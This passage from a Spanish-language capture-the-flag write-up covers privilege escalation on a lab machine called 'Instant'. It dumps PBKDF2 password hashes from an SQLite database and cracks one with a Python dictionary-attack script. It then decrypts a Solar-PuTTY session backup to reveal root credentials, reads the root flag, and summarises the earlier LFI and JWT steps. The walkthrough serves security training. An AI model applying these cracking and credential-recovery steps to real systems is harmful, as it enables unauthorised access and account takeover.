+</span></span><span style="display:flex;"><span>instant.db                                      100%<span style="color:#ff7b72;font-weight:bold">[====================================================================================================</span>&gt;<span style="color:#ff7b72;font-weight:bold">]</span>  36.00K  --.-KB/s    in 0.1s    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2026-10-17 21:08:19 <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">254</span> KB/s<span style="color:#ff7b72;font-weight:bold">)</span> - ‘instant.db’ saved <span style="color:#ff7b72;font-weight:bold">[</span>36864/36864<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span></code></pre></div><p>Con <code>sqlite3</code> revisamos las tablas y extraemos los datos de usuarios, encontrando dos hashes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlite3 instant.db
+</span></span><span style="display:flex;"><span>SQLite version 3.46.1 2024-08-13 09:16:08
+</span></span><span style="display:flex;"><span>Enter <span style="color:#a5d6ff">&#34;.help&#34;</span> <span style="color:#ff7b72">for</span> usage hints.
+</span></span><span style="display:flex;"><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span>wallet_transactions  wallet_users         wallet_wallets
+</span></span><span style="display:flex;"><span>sqlite&gt; <span style="color:#ff7b72">select</span> * from wallet_users;
+</span></span><span style="display:flex;"><span>1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000<span style="color:#79c0ff">$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978</span>|2024-07-23 00:20:52.529887|87348|Admin|active
+</span></span><span style="display:flex;"><span>2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000<span style="color:#79c0ff">$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed</span>|2024-08-08 20:57:47.909667|42845|instantian|active
+</span></span></code></pre></div><p>Estos hashes corresponden al formato PBKDF2-HMAC-SHA256 de Werkzeug, utilizado habitualmente por aplicaciones Python con Flask.</p>
+<p>Para descifrarlos, guardamos el hash en un archivo llamado <code>hash.txt</code> y empleamos el siguiente script en <code>python</code>, que realiza un ataque de diccionario contra <code>rockyou.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">hashlib</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>h <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">&#34;pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>prefix, salt, target <span style="color:#ff7b72;font-weight:bold">=</span> h<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34;$&#34;</span>)
+</span></span><span style="display:flex;"><span>iterations <span style="color:#ff7b72;font-weight:bold">=</span> int(prefix<span style="color:#ff7b72;font-weight:bold">.</span>split(<span style="color:#a5d6ff">&#34;:&#34;</span>)[<span style="color:#a5d6ff">2</span>])
+</span></span><span style="display:flex;"><span>salt_bytes <span style="color:#ff7b72;font-weight:bold">=</span> salt<span style="color:#ff7b72;font-weight:bold">.</span>encode()
+</span></span><span style="display:flex;"><span>target <span style="color:#ff7b72;font-weight:bold">=</span> target<span style="color:#ff7b72;font-weight:bold">.</span>lower()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">with</span> open(<span style="color:#a5d6ff">&#34;/usr/share/wordlists/rockyou.txt&#34;</span>, <span style="color:#a5d6ff">&#34;rb&#34;</span>) <span style="color:#ff7b72">as</span> f:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> line <span style="color:#ff7b72;font-weight:bold">in</span> f:
+</span></span><span style="display:flex;"><span>        password <span style="color:#ff7b72;font-weight:bold">=</span> line<span style="color:#ff7b72;font-weight:bold">.</span>rstrip(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">\r\n</span><span style="color:#a5d6ff">&#34;</span>)
+</span></span><span style="display:flex;"><span>        dk <span style="color:#ff7b72;font-weight:bold">=</span> hashlib<span style="color:#ff7b72;font-weight:bold">.</span>pbkdf2_hmac(<span style="color:#a5d6ff">&#34;sha256&#34;</span>, password, salt_bytes, iterations)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span> dk<span style="color:#ff7b72;font-weight:bold">.</span>hex() <span style="color:#ff7b72;font-weight:bold">==</span> target:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#a5d6ff">&#34;Contraseña encontrada:&#34;</span>, password<span style="color:#ff7b72;font-weight:bold">.</span>decode(errors<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">&#34;replace&#34;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>
+</span></span></code></pre></div><p>Al ejecutarlo obtenemos el siguiente resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 decrypt.py 
+</span></span><span style="display:flex;"><span>Contraseña encontrada: estrella
+</span></span></code></pre></div><p>Dado que no sabemos a qué corresponde esta contraseña, continuamos enumerando archivos del sistema de los que seamos propietarios.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shirohige@instant:~/projects/mywallet/Instant-Api/mywallet/instance$ find / -type f -user shirohige 2&gt;/dev/null | grep -vE <span style="color:#a5d6ff">&#34;home|sys|proc&#34;</span>
+</span></span><span style="display:flex;"><span>/opt/backups/Solar-PuTTY/sessions-backup.dat
+</span></span></code></pre></div><p>Encontramos el archivo <code>/opt/backups/Solar-PuTTY/sessions-backup.dat</code>.</p>
+<p>Al buscar en Google qué es Solar-PuTTY, obtenemos la siguiente información:</p>
+<pre tabindex="0"><code>Solar-PuTTY es un cliente SSH gratuito para Windows desarrollado por SolarWinds que amplía y mejora las funciones del conocido emulador de terminal PuTTY
+</code></pre><p>Investigando qué puede hacerse con el archivo <code>sessions-backup.dat</code>, confirmamos que corresponde a una copia de seguridad de las sesiones de Solar-PuTTY, y que para recuperar esa información —incluidas las contraseñas— se puede utilizar una herramienta llamada <code>Solar PuTTY Decryptor</code>.</p>
+<p>Clonamos el proyecto con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/Wind010/SolarPuttyDecryptor.git
+</span></span></code></pre></div><p>Para desencriptar el contenido, usamos el siguiente comando junto con la contraseña <code>estrella</code> obtenida anteriormente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 SolarPuttyDecryptor.py sessions-backup.dat --password <span style="color:#a5d6ff">&#39;estrella&#39;</span>
+</span></span></code></pre></div><p>Esto expone la información de la sesión, incluidas las credenciales:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;Credentials&#34;</span>: <span style="color:#ff7b72;font-weight:bold">[</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;Id&#34;</span>: <span style="color:#a5d6ff">&#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;CredentialsName&#34;</span>: <span style="color:#a5d6ff">&#34;instant-root&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;Username&#34;</span>: <span style="color:#a5d6ff">&#34;root&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;Password&#34;</span>: <span style="color:#a5d6ff">&#34;12**24nzC!r0c%q12&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;PrivateKeyPath&#34;</span>: <span style="color:#a5d6ff">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;Passphrase&#34;</span>: <span style="color:#a5d6ff">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a5d6ff">&#34;PrivateKeyContent&#34;</span>: null
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72;font-weight:bold">}</span>
+</span></span></code></pre></div><p>Con las credenciales de <code>root</code>, cambiamos de usuario y obtenemos privilegios máximos para leer la flag <code>root.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su root
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>root@instant:/home/shirohige# cat /root/root.txt
+</span></span><span style="display:flex;"><span>f882b29ff8a12c0b34a0b4a3c40e4792
+</span></span></code></pre></div><h1 id="conclusión">
+  Conclusión
+  <a class="heading-link" href="#conclusi%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>En Instant, el punto de partida no está en el servicio web directamente, sino en la aplicación móvil que este distribuye: su ingeniería inversa con <code>jadx</code> revela subdominios ocultos, un endpoint de documentación Swagger y un JWT embebido que permite autenticarse como administrador en la API. Desde ahí, un endpoint de lectura de logs resulta vulnerable a Local File Inclusion, lo que permite filtrar <code>/etc/passwd</code> y, a partir del usuario identificado, la clave privada SSH de <code>shirohige</code>, logrando el acceso inicial a la máquina.</p>
+<p>Para la escalada a <code>root</code>, la base de datos SQLite de la aplicación expone hashes PBKDF2-HMAC-SHA256 que, al ser crackeados mediante ataque de diccionario con <code>rockyou.txt</code>, entregan una contraseña reutilizada en otro contexto: el cifrado de un backup de sesiones de Solar-PuTTY propiedad de <code>shirohige</code>. Al desencriptar ese backup con <code>Solar PuTTY Decryptor</code> se obtienen las credenciales de <code>root</code>, con las que se completa el compromiso total del sistema.</p>
+<p>En resumen, la máquina pone a prueba la ingeniería inversa de aplicaciones Android, la enumeración de subdominios y APIs documentadas, la explotación de LFI, y la reutilización de contraseñas entre distintos servicios para escalar privilegios.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
